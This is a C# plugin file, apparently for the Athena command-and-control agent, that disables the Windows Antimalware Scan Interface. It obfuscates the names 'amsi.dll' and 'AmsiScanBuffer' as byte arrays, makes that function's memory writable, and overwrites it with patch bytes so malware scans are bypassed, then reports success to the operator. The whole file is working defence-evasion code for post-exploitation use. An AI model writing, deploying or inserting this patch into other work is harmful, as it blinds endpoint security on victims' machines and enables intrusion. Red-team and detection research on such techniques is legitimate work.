using PluginBase;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Plugin
{
    public static class amsi
    {
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
        public static ResponseResult Execute(Dictionary<string, object> args)
        {
            try
            {

                if (Patch())
                {
                    return new ResponseResult
                    {
                        completed = "true",
                        user_output = "Success",
                        task_id = (string)args["task-id"], //task-id passed in from Athena
                    };
                }
                else
                {
                    return new ResponseResult
                    {
                        completed = "true",
                        user_output = "Failed",
                        task_id = (string)args["task-id"], //task-id passed in from Athena
                        status = "error"
                    };
                }
            }
            catch (Exception e)
            {
                //oh no an error
                return new ResponseResult
                {
                    completed = "true",
                    user_output = e.Message,
                    task_id = (string)args["task-id"],
                    status = "error"
                };
            }
        }
        public static bool Patch()
        {
            byte[] dllBytes = new byte[] { 0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c };
            IntPtr someDLL = LoadLibrary(Encoding.ASCII.GetString(dllBytes));
            if (someDLL == IntPtr.Zero)
            {
                return false;
            }
            byte[] bufBytes = new byte[] { 0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72 };
            IntPtr pAmsi = GetProcAddress(someDLL, Encoding.ASCII.GetString(bufBytes));
            if (pAmsi == IntPtr.Zero)
            {
                return false;
            }

            UIntPtr dwSize = (UIntPtr)4;
            uint Zero = 0;

            if (!VirtualProtect(pAmsi, dwSize, 0x40, out Zero))
            {
                return false;
            }

            Byte[] biz = { 0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3 }; 

            IntPtr ptr = Marshal.AllocHGlobal(13);
            Marshal.Copy(biz, 0, ptr, 13);

            MoveMemory(pAmsi + 0x001b, ptr, 13);
            return true;
        }
    }

}
